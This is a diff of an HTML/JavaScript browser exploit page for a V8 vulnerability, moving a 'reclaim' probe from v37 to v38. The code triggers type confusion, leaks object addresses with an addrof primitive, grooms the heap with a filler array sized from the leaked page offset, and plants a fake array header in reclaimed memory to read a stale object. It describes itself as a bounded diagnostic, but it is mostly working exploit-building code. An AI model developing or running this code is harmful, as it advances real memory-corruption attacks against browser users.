@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>CVE-2026-85046 single-maximum reclaim v37</title>
+  <title>CVE-2026-85046 late-page reclaim v38</title>
   <style>
     :root { color-scheme: dark; font-family: ui-monospace, SFMono-Regular, Consolas, monospace; }
     body { margin: 0; padding: 24px; background: #09110e; color: #d9ffe7; }
@@ -16,17 +16,14 @@
 </head>
 <body>
 <main>
-  <h1>CVE-2026-85046 — single-maximum reclaim v37</h1>
+  <h1>CVE-2026-85046 — late-page reclaim v38</h1>
   <p>
-    This one-shot diagnostic uses the GC window measured by v34. It first ages
-    the vulnerable receiver, verifies that a fresh-page maximum regular
-    FixedDoubleArray could cover the complete stale 16-byte header, and arms two
-    post-move weak controls. Once both controls finalize, the next task retains
-    exactly one 0x3fff-double payload and immediately performs one stale
-    length-marker check. If that check returns, a post-check address observation
-    reports the actual payload range. It performs no header write, arbitrary
-    memory expansion, native-code execution, sandbox escape, file, or network
-    operation.
+    This one-shot diagnostic extends v37 to stale addresses in the second half
+    of a regular V8 page. It derives one benign filler size from the stale page
+    offset, waits for the v34 two-control GC signal, then performs exactly one
+    filler allocation, one phase-0 payload allocation, and one immediate stale
+    length-marker read. It performs no header write, arbitrary-memory access,
+    native-code execution, sandbox escape, file access, or network operation.
   </p>
   <button id="run">Run one-shot bounded probe</button>
   <pre id="output"></pre>
@@ -42,15 +39,16 @@ var CONFIG = Object.freeze({
   allocationLength: 0x400,
   approximateKiBPerChunk: 512,
   pageBytes: 0x40000,
-  freshPageDataOffset: 0x18,
+  pageAreaStart: 0x10,
+  fillerJsArrayHeaderBytes: 0x10,
   payloadLength: 0x3fff,
   fixedDoubleArrayBytes: 0x20000,
   payloadDataBytes: 0x1fff8,
-  marker: 37,
+  marker: 38,
 });
 
-var STORAGE_ATTEMPT = "f022-v37-attempt";
-var STORAGE_LAST = "f022-v37-last";
+var STORAGE_ATTEMPT = "f022-v38-attempt";
+var STORAGE_LAST = "f022-v38-last";
 var IS_LINUX_STOCK = /Linux/.test(navigator.platform || "") &&
   !/Windows NT/.test(navigator.userAgent || "");
 var PACKED_DOUBLE_MAP = IS_LINUX_STOCK ? 0x01032a35 : 0x01032a81;
@@ -65,16 +63,20 @@ var state = {
   targetWeak: null,
   beforeAddress: 0,
   pageOffset: 0,
-  predictedDataStart: 0,
+  selectedStart: 0,
+  fillerObjectBytes: 0,
+  fillerLength: 0,
+  predictedPayloadDataStart: 0,
+  predictedPayloadEnd: 0,
   predictedResidue: -1,
   geometryCovered: false,
-  selectedPhase: -1,
+  dryRunCalibration: null,
   victim: null,
   victimBase: 0,
   victimElementsTagged: 0,
   patternEven: 0,
   patternOdd: 0,
-  payloadAllocator: null,
+  retainedFiller: null,
   retainedPayload: null,
   typeConfusionObserved: false,
   addrofObserved: false,
@@ -122,14 +124,14 @@ function persist(key, value) {
   try { localStorage.setItem(key, JSON.stringify(value)); } catch (_) {}
 }
 
-function resetV37OneShot() {
+function resetV38OneShot() {
   try {
     localStorage.removeItem(STORAGE_ATTEMPT);
     localStorage.removeItem(STORAGE_LAST);
   } catch (_) {}
-  log("[v37] persistence reset. Use only after opening a genuinely fresh renderer.");
+  log("[v38] persistence reset. Use only after opening a genuinely fresh renderer.");
 }
-window.resetV37OneShot = resetV37OneShot;
+window.resetV38OneShot = resetV38OneShot;
 
 function confuse(array) {
   function compare() { array.fill(0); return 0; }
@@ -163,37 +165,61 @@ function allocationChunk() {
   }
 }
 
-// Separate exact sites let both possible rotations be primed before the stale
-// target exists. The critical task reuses one of these sites without an
-// elements-kind transition or a second payload allocation.
+// Exact call sites reused by the critical task. The dry run establishes
+// double-elements allocation feedback only; it does not prove contiguity or
+// absence of an AllocationMemento in the later reclaimed page.
+function allocateFiller(length) {
+  return new Array(length).fill(1.23456789012345);
+}
+
 function allocatePhase0Payload() {
   var payload = new Array(CONFIG.payloadLength).fill(state.patternEven);
   for (var i = 1; i < payload.length; i += 2) payload[i] = state.patternOdd;
   return payload;
 }
 
-function allocatePhase4Payload() {
-  var payload = new Array(CONFIG.payloadLength).fill(state.patternEven);
-  for (var i = 1; i < payload.length; i += 2) payload[i] = state.patternOdd;
-  return payload;
-}
-
-function primeExactPayloadSites() {
+function primeExactAllocationSites() {
+  var filler = allocateFiller(0x3c60);
   var savedEven = state.patternEven;
   var savedOdd = state.patternOdd;
   state.patternEven = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
   state.patternOdd = w2f(0x00001001, CONFIG.marker << 1);
-  var phase0 = allocatePhase0Payload();
-  var sink = phase0.length;
-  phase0 = null;
-  state.patternEven = w2f(EMPTY_PROPERTIES, 0x00001001);
-  state.patternOdd = w2f(CONFIG.marker << 1, PACKED_DOUBLE_MAP);
-  var phase4 = allocatePhase4Payload();
-  sink += phase4.length;
-  phase4 = null;
+  var payload = allocatePhase0Payload();
+  var sink = filler.length + payload.length;
   state.patternEven = savedEven;
   state.patternOdd = savedOdd;
-  return sink;
+  return { filler: filler, payload: payload, sink: sink };
+}
+
+function calibrateExactAllocationSites() {
+  var dryRun = primeExactAllocationSites();
+  var fillerAddress = addrofLeak(dryRun.filler);
+  var payloadAddress = addrofLeak(dryRun.payload);
+  var samePage = fillerAddress && payloadAddress &&
+    (fillerAddress & ~(CONFIG.pageBytes - 1)) ===
+      (payloadAddress & ~(CONFIG.pageBytes - 1));
+  var jsArrayDelta = fillerAddress && payloadAddress
+    ? (payloadAddress - fillerAddress) | 0 : null;
+  var effectiveGap = jsArrayDelta === null
+    ? null : jsArrayDelta - CONFIG.fixedDoubleArrayBytes;
+  var verified = samePage &&
+    jsArrayDelta === CONFIG.fixedDoubleArrayBytes +
+      CONFIG.fillerJsArrayHeaderBytes;
+  var result = {
+    classification: "pre-target-dry-run-only",
+    sameRegularPageByJsArrayAddresses: !!samePage,
+    fillerJsArrayAddress: fillerAddress ? hex(fillerAddress) : null,
+    payloadJsArrayAddress: payloadAddress ? hex(payloadAddress) : null,
+    jsArrayAddressDelta: jsArrayDelta,
+    inferredEffectiveGap: effectiveGap,
+    expectedEffectiveGap: CONFIG.fillerJsArrayHeaderBytes,
+    exactSiteGapVerified: !!verified,
+    limitation:
+      "The dry run proves only the observed exact call-site layout in this pre-target run; the critical reclaimed-page allocation may still choose another LAB/free-list path.",
+  };
+  dryRun.filler = null;
+  dryRun.payload = null;
+  return result;
 }
 
 function readNumericStaleSlot() {
@@ -209,19 +235,47 @@ function readNumericStaleSlot() {
   return { numeric: numeric, address: staleSlot };
 }
 
+function alignUpToResidue8(value) {
+  var remainder = value & 0xf;
+  return (value + ((8 - remainder + 16) & 0xf)) >>> 0;
+}
+
 function geometryFor(address) {
-  var pageOffset = address & (CONFIG.pageBytes - 1);
-  var covered = pageOffset >= CONFIG.freshPageDataOffset &&
-    pageOffset + 16 <= CONFIG.freshPageDataOffset + CONFIG.payloadDataBytes;
-  var residue = covered
-    ? (pageOffset - CONFIG.freshPageDataOffset) & 0xf
-    : -1;
-  var phase = residue === 0 ? 0 : (residue === 12 ? 4 : -1);
+  var targetOffset = address & (CONFIG.pageBytes - 1);
+  var minimumStart = targetOffset + 16 - CONFIG.fixedDoubleArrayBytes;
+  if (minimumStart < 0) minimumStart = 0;
+  var start = alignUpToResidue8(minimumStart);
+  var fillerObjectBytes = start -
+    (CONFIG.pageAreaStart + CONFIG.fillerJsArrayHeaderBytes);
+  var fillerNumerator = fillerObjectBytes - 8;
+  var payloadDataStart = start + 8;
+  var payloadEnd = start + CONFIG.fixedDoubleArrayBytes;
+  var payloadHeaderEnd = payloadEnd + CONFIG.fillerJsArrayHeaderBytes;
+  var distance = targetOffset - payloadDataStart;
+  var fillerValid = fillerObjectBytes >= 8 &&
+    fillerNumerator >= 0 && (fillerNumerator & 7) === 0;
+  var fillerLength = fillerValid ? fillerNumerator / 8 : -1;
+  var covered = distance >= 0 && targetOffset + 16 <= payloadEnd;
+  var residue = covered ? distance & 0xf : -1;
+
   return {
-    pageOffset: pageOffset,
+    targetOffset: targetOffset,
+    minimumStart: minimumStart,
+    start: start,
+    fillerObjectBytes: fillerObjectBytes,
+    fillerLength: fillerLength,
+    payloadDataStart: payloadDataStart,
+    payloadEnd: payloadEnd,
+    payloadHeaderEnd: payloadHeaderEnd,
+    remainingPageBytes: CONFIG.pageBytes - payloadHeaderEnd,
+    distance: distance,
+    startAligned: (start & 0xf) === 8,
+    startWithinFirstHalf: start <= CONFIG.fixedDoubleArrayBytes,
+    fillerValid: fillerValid,
+    pageFit: payloadHeaderEnd <= CONFIG.pageBytes,
     covered: covered,
     residue: residue,
-    phase: phase,
+    phase0: residue === 0,
   };
 }
 
@@ -235,11 +289,26 @@ function baseResult(outcome) {
     packedDoubleMap: hex(PACKED_DOUBLE_MAP),
     beforeAddress: state.beforeAddress ? hex(state.beforeAddress) : null,
     pageOffset: hex(state.pageOffset),
-    assumedFreshPageDataOffset: hex(CONFIG.freshPageDataOffset),
-    predictedFullHeaderCovered: state.geometryCovered,
-    predictedResidue: state.predictedResidue,
-    selectedPhase: state.selectedPhase,
     marker: CONFIG.marker,
+    geometry: {
+      model: "fresh regular page; no allocation memento/intervening object",
+      modelVerifiedBeforeRead: false,
+      pageAreaStart: hex(CONFIG.pageAreaStart),
+      fillerJsArrayHeaderBytes: hex(CONFIG.fillerJsArrayHeaderBytes),
+      selectedPayloadObjectStart: state.selectedStart ? hex(state.selectedStart) : null,
+      fillerObjectBytes: state.fillerObjectBytes ? hex(state.fillerObjectBytes) : null,
+      fillerLength: state.fillerLength,
+      predictedPayloadDataStart: state.predictedPayloadDataStart
+        ? hex(state.predictedPayloadDataStart) : null,
+      predictedPayloadEnd: state.predictedPayloadEnd
+        ? hex(state.predictedPayloadEnd) : null,
+      predictedFullHeaderCovered: state.geometryCovered,
+      predictedResidue: state.predictedResidue,
+      selectedPhase: state.geometryCovered ? 0 : -1,
+      allocationMementoCaveat:
+        "An unobserved 8-byte AllocationMemento/intervening object would flip phase and invalidate the prediction; only marker equality upgrades placement proof.",
+      preTargetDryRunCalibration: state.dryRunCalibration,
+    },
     moveChunk: state.moveChunk,
     moveAddress: state.moveAddress ? hex(state.moveAddress) : null,
     controlA: {
@@ -251,13 +320,19 @@ function baseResult(outcome) {
       finalizedChunk: state.controlBFinalizedChunk,
     },
     allocationGeometry: {
-      count: 1,
-      javascriptLength: CONFIG.payloadLength,
-      fixedDoubleArrayBytes: CONFIG.fixedDoubleArrayBytes,
+      criticalCount: 2,
+      fillerCount: 1,
+      payloadCount: 1,
+      fillerJavascriptLength: state.fillerLength,
+      fillerFixedDoubleArrayBytes: state.fillerObjectBytes,
+      payloadJavascriptLength: CONFIG.payloadLength,
+      payloadFixedDoubleArrayBytes: CONFIG.fixedDoubleArrayBytes,
       payloadDataBytes: CONFIG.payloadDataBytes,
     },
     bad2LengthChecks: 0,
-    headerWriteAttempted: false,
+    reclaimPayloadContainsFakeHeader: false,
+    reclaimHeaderPlacementAttempted: false,
+    directHeaderWriteAttempted: false,
     arbitraryMemoryAccessAttempted: false,
     nativeCodeExecutionAttempted: false,
     sandboxEscapeAttempted: false,
@@ -271,12 +346,13 @@ function releaseFragileReferences() {
   state.controlAWeak = null;
   state.controlBWeak = null;
   state.victim = null;
+  state.retainedFiller = null;
   state.retainedPayload = null;
-  state.payloadAllocator = null;
 }
 
-function publishDiagnostic(outcome) {
+function publishDiagnostic(outcome, detail) {
   var result = baseResult(outcome);
+  if (detail) result.gateDetail = detail;
   window.probeResult = result;
   releaseFragileReferences();
   persist(STORAGE_LAST, result);
@@ -303,14 +379,15 @@ function scheduleCriticalIfReady() {
   state.criticalScheduled = true;
   if (state.oracleTimer !== null) clearTimeout(state.oracleTimer);
   state.oracleTimer = null;
-  setTimeout(criticalSingleAllocationTask, 0);
+  setTimeout(criticalLatePageTask, 0);
 }
 
-function criticalSingleAllocationTask() {
-  // CRITICAL WINDOW: keep this first statement as the sole retained payload
-  // allocation. Do not add logging, stringification, persistence, addrof, or
-  // another allocation before the following single stale length read.
-  state.retainedPayload = state.payloadAllocator();
+function criticalLatePageTask() {
+  // CRITICAL WINDOW: filler -> phase-0 payload -> one stale length read.
+  // Do not insert logging, persistence, JSON, String, addrof, storage, or a
+  // third allocation before that read.
+  state.retainedFiller = allocateFiller(state.fillerLength);
+  state.retainedPayload = allocatePhase0Payload();
   var observedLength = null;
   var readReturned = false;
   var readThrew = false;
@@ -323,43 +400,60 @@ function criticalSingleAllocationTask() {
     readErrorName = error && error.name ? error.name : "Error";
   }
 
-  // The only stale-object property read has returned. Address observation and
-  // result formatting are deliberately post-check diagnostics.
+  // The sole stale property read has completed. Diagnostics below are
+  // deliberately post-read and remain conditional placement inference.
   var markerLanded = observedLength === CONFIG.marker;
+  var fillerAddress = addrofLeak(state.retainedFiller);
   var payloadAddress = addrofLeak(state.retainedPayload);
-  var actualDataStart = (payloadAddress - CONFIG.fixedDoubleArrayBytes + 8) >>> 0;
-  var actualDistance = (state.beforeAddress - actualDataStart) >>> 0;
-  var actualCovered = actualDistance + 16 <= CONFIG.payloadDataBytes;
-  var actualResidue = actualDistance & 0xf;
-  var actualPhaseRequired = actualResidue === 0 ? 0 :
-    (actualResidue === 12 ? 4 : -1);
-  var stale = readNumericStaleSlot();
-
+  var inferredFillerDataStart = fillerAddress
+    ? (fillerAddress - state.fillerObjectBytes + 8) >>> 0 : 0;
+  var inferredFillerStart = inferredFillerDataStart
+    ? (inferredFillerDataStart - 8) >>> 0 : 0;
+  var inferredFillerEnd = inferredFillerStart
+    ? (inferredFillerStart + state.fillerObjectBytes) >>> 0 : 0;
+  var inferredPayloadDataStart = payloadAddress
+    ? (payloadAddress - CONFIG.fixedDoubleArrayBytes + 8) >>> 0 : 0;
+  var inferredPayloadStart = inferredPayloadDataStart
+    ? (inferredPayloadDataStart - 8) >>> 0 : 0;
+  var inferredGap = inferredFillerEnd && inferredPayloadStart
+    ? (inferredPayloadStart - inferredFillerEnd) | 0 : null;
+  var actualDistance = inferredPayloadDataStart
+    ? (state.beforeAddress - inferredPayloadDataStart) >>> 0 : 0;
+  var actualCovered = inferredPayloadDataStart
+    ? actualDistance + 16 <= CONFIG.payloadDataBytes : false;
+  var actualResidue = inferredPayloadDataStart ? actualDistance & 0xf : null;
   var result = baseResult(markerLanded
-    ? "v37-single-maximum-marker-landed"
-    : "v37-single-maximum-returned-without-marker");
+    ? "v38-late-page-marker-landed"
+    : (readThrew ? "v38-late-page-read-threw"
+      : "v38-late-page-returned-without-marker"));
   result.observedLength = observedLength;
   result.markerLanded = markerLanded;
   result.bad2LengthChecks = 1;
   result.bad2LengthReadReturned = readReturned;
   result.bad2LengthReadThrew = readThrew;
   result.bad2LengthReadErrorName = readErrorName;
-  result.staleSlotAfter = stale.numeric ? hex(stale.address) : null;
-  result.staleSlotStillOriginal = stale.numeric && stale.address === state.beforeAddress;
+  result.reclaimPayloadContainsFakeHeader = true;
+  result.reclaimHeaderPlacementAttempted = true;
+  result.postReadStaleSlotInspectionAttempted = false;
   result.postCheckPlacement = {
     classification: "conditional-inference-only",
-    formula: "inferredDataStart = addrof(payload) - 0x20000 + 8",
-    formulaAssumption: "non-folded maximum-regular FixedDoubleArray immediately precedes JSArray",
+    formulaAssumption:
+      "each non-folded FixedDoubleArray immediately precedes its JSArray",
+    fillerJsArrayAddress: fillerAddress ? hex(fillerAddress) : null,
+    inferredFillerObjectStart: inferredFillerStart ? hex(inferredFillerStart) : null,
+    inferredFillerEnd: inferredFillerEnd ? hex(inferredFillerEnd) : null,
     payloadJsArrayAddress: payloadAddress ? hex(payloadAddress) : null,
-    inferredDataStart: payloadAddress ? hex(actualDataStart) : null,
-    distanceFromInferredDataStart: payloadAddress ? hex(actualDistance) : null,
-    inferredFullHeaderCovered: payloadAddress ? actualCovered : false,
-    inferredResidue: payloadAddress ? actualResidue : null,
-    inferredPhaseRequired: payloadAddress ? actualPhaseRequired : null,
-    selectedPhaseMatchedInference: payloadAddress
-      ? actualPhaseRequired === state.selectedPhase
-      : false,
-    upgradesPlacementProof: false,
+    inferredPayloadObjectStart: inferredPayloadStart ? hex(inferredPayloadStart) : null,
+    inferredPayloadDataStart: inferredPayloadDataStart
+      ? hex(inferredPayloadDataStart) : null,
+    inferredGapBetweenFillerAndPayload: inferredGap,
+    expectedGapBetweenFillerAndPayload: CONFIG.fillerJsArrayHeaderBytes,
+    inferredGapMatchesModel: inferredGap === CONFIG.fillerJsArrayHeaderBytes,
+    inferredDistanceToStale: inferredPayloadDataStart ? hex(actualDistance) : null,
+    inferredFullHeaderCovered: actualCovered,
+    inferredResidue: actualResidue,
+    selectedPhaseMatchedInference: actualResidue === 0,
+    upgradesPlacementProof: markerLanded,
   };
 
   window.probeResult = result;
@@ -391,8 +485,16 @@ function preAgeTask(index) {
   }
 
   log("[+] Receiver/backing pre-age completed: " + CONFIG.preAgeChunks + " chunks.");
-  log("[*] Priming both exact 0x3fff double-payload sites before stale creation.");
-  primeExactPayloadSites();
+  log("[*] Priming exact filler and phase-0 payload call sites before stale creation.");
+  state.dryRunCalibration = calibrateExactAllocationSites();
+  if (!state.dryRunCalibration.exactSiteGapVerified) {
+    publishDiagnostic("v38-pretarget-gap-calibration-rejected", {
+      calibration: state.dryRunCalibration,
+      reason:
+        "Fail-closed: exact dry-run sites did not share one regular page with the expected 0x10 effective gap.",
+    });
+    return;
+  }
   state.victimBase = addrofLeak(state.victim);
   if (!state.victimBase || state.victimBase <= 0x10000 ||
       state.victimBase >= 0xfffffff0 || (state.victimBase & 3) !== 0) {
@@ -406,56 +508,94 @@ function preAgeTask(index) {
     publishDiagnostic("target-address-leak-not-observed");
     return;
   }
-
-  var geometry = geometryFor(state.beforeAddress);
-  state.pageOffset = geometry.pageOffset;
-  state.predictedDataStart =
-    ((state.beforeAddress & ~(CONFIG.pageBytes - 1)) + CONFIG.freshPageDataOffset) >>> 0;
-  state.geometryCovered = geometry.covered;
-  state.predictedResidue = geometry.residue;
-  state.selectedPhase = geometry.phase;
-
-  if (!geometry.covered || geometry.phase < 0) {
-    publishDiagnostic(!geometry.covered
-      ? "v37-geometry-gate-no-full-header-coverage"
-      : "v37-geometry-gate-unsupported-residue");
+  if (state.beforeAddress <= 0x10000 || state.beforeAddress >= 0xfffffff0 ||
+      (state.beforeAddress & 3) !== 0) {
+    publishDiagnostic("target-address-leak-implausible-or-misaligned", {
+      beforeAddress: hex(state.beforeAddress),
+      requiredAlignmentBytes: 4,
+    });
     return;
   }
 
-  var fakeLengthSmi = CONFIG.marker << 1;
-  if (state.selectedPhase === 0) {
-    state.patternEven = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
-    state.patternOdd = w2f(state.victimElementsTagged, fakeLengthSmi);
-    state.payloadAllocator = allocatePhase0Payload;
-  } else {
-    state.patternEven = w2f(EMPTY_PROPERTIES, state.victimElementsTagged);
-    state.patternOdd = w2f(fakeLengthSmi, PACKED_DOUBLE_MAP);
-    state.payloadAllocator = allocatePhase4Payload;
+  var geometry = geometryFor(state.beforeAddress);
+  state.pageOffset = geometry.targetOffset;
+  state.selectedStart = geometry.start;
+  state.fillerObjectBytes = geometry.fillerObjectBytes;
+  state.fillerLength = geometry.fillerLength;
+  state.predictedPayloadDataStart = geometry.payloadDataStart;
+  state.predictedPayloadEnd = geometry.payloadEnd;
+  state.geometryCovered = geometry.covered && geometry.phase0;
+  state.predictedResidue = geometry.residue;
+
+  var gateDetail = {
+    minimumPayloadObjectStart: hex(geometry.minimumStart),
+    selectedPayloadObjectStart: hex(geometry.start),
+    selectedStartMod16: geometry.start & 0xf,
+    fillerObjectBytes: geometry.fillerObjectBytes,
+    fillerLength: geometry.fillerLength,
+    predictedPayloadDataStart: hex(geometry.payloadDataStart),
+    predictedPayloadEnd: hex(geometry.payloadEnd),
+    predictedPayloadHeaderEnd: hex(geometry.payloadHeaderEnd),
+    remainingPageBytes: geometry.remainingPageBytes,
+    distanceFromPayloadData: geometry.distance,
+    startAlignedToResidue8: geometry.startAligned,
+    startWithinFirstHalf: geometry.startWithinFirstHalf,
+    fillerValid: geometry.fillerValid,
+    payloadAndHeaderFitPage: geometry.pageFit,
+    fullHeaderCovered: geometry.covered,
+    residue: geometry.residue,
+    phase0: geometry.phase0,
+    preTargetDryRunGapVerified:
+      state.dryRunCalibration.exactSiteGapVerified,
+    criticalGapVerifiedBeforeRead: false,
+    preTargetDryRunCalibration: state.dryRunCalibration,
+  };
+
+  if (!geometry.startAligned || !geometry.startWithinFirstHalf ||
+      !geometry.fillerValid || !geometry.pageFit || !geometry.covered ||
+      !geometry.phase0 || !state.dryRunCalibration.exactSiteGapVerified) {
+    publishDiagnostic("v38-geometry-gate-rejected", gateDetail);
+    return;
   }
 
+  state.patternEven = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
+  state.patternOdd = w2f(state.victimElementsTagged, CONFIG.marker << 1);
+
   var stale = readNumericStaleSlot();
-  var armed = baseResult("v37-armed-before-controls");
+  if (!stale.numeric || stale.address !== state.beforeAddress) {
+    publishDiagnostic("v38-preoracle-stale-slot-gate-rejected", {
+      beforeAddress: hex(state.beforeAddress),
+      staleSlotNumeric: stale.numeric,
+      staleSlotBeforeOracle: stale.numeric ? hex(stale.address) : null,
+      staleSlotStillOriginal: stale.numeric && stale.address === state.beforeAddress,
+    });
+    return;
+  }
+  var armed = baseResult("v38-armed-before-controls");
+  armed.gateDetail = gateDetail;
   armed.victimBase = hex(state.victimBase);
   armed.victimElementsTagged = hex(state.victimElementsTagged);
-  armed.predictedDataStart = hex(state.predictedDataStart);
   armed.staleSlotBeforeOracle = stale.numeric ? hex(stale.address) : null;
   armed.staleSlotStillOriginal = stale.numeric && stale.address === state.beforeAddress;
-  armed.criticalWillAttemptOnePayloadAndOneLengthRead = true;
+  armed.criticalSequence =
+    "one benign filler; one phase-0 fake payload; one immediate bad[2].length";
   armed.crashEvidenceBoundary =
-    "If the renderer exits after this record, allocation completion and read entry are intentionally indistinguishable; no post-allocation persistence is permitted in the critical window.";
+    "If the renderer exits after this record, filler completion, payload completion, and stale-read entry are intentionally indistinguishable; the critical window contains no persistence or logging.";
   persist(STORAGE_LAST, armed);
   persist(STORAGE_ATTEMPT, {
     status: "armed",
     runId: state.runId,
     beforeAddress: hex(state.beforeAddress),
     pageOffset: hex(state.pageOffset),
-    selectedPhase: state.selectedPhase,
+    selectedPayloadObjectStart: hex(state.selectedStart),
+    fillerLength: state.fillerLength,
+    phase: 0,
   });
 
   log("[+] Stale edge armed at " + hex(state.beforeAddress) +
       "; pageOffset=" + hex(state.pageOffset) +
-      "; residue=" + state.predictedResidue +
-      "; phase=" + state.selectedPhase + ".");
+      "; payloadStart=" + hex(state.selectedStart) +
+      "; fillerLength=" + state.fillerLength + ".");
   log("[*] Armed metadata persisted before controls. Starting bounded GC oracle.");
   state.oracleTimer = setTimeout(oracleTask, 0);
 }
@@ -516,12 +656,12 @@ function run() {
     previousAttempt = localStorage.getItem(STORAGE_ATTEMPT);
     previousLast = localStorage.getItem(STORAGE_LAST);
   } catch (_) {}
-  if (previousLast) log("[previous v37 record] " + previousLast);
+  if (previousLast) log("[previous v38 record] " + previousLast);
   if (previousAttempt) {
     var stopped = {
-      outcome: "v37-one-test-per-fresh-renderer-gate",
+      outcome: "v38-one-test-per-fresh-renderer-gate",
       previousAttempt: previousAttempt,
-      instruction: "Open a genuinely fresh renderer before resetting v37 persistence.",
+      instruction: "Open a genuinely fresh renderer before resetting v38 persistence.",
       bad2LengthChecks: 0,
       nativeCodeExecutionAttempted: false,
       sandboxEscapeAttempted: false,
@@ -534,8 +674,6 @@ function run() {
     return;
   }
 
-  // Claim this origin/renderer before any heap work. Even a geometry-gated or
-  // interrupted attempt must not silently rerun in the same renderer.
   persist(STORAGE_ATTEMPT, {
     status: "started",
     runId: state.runId,
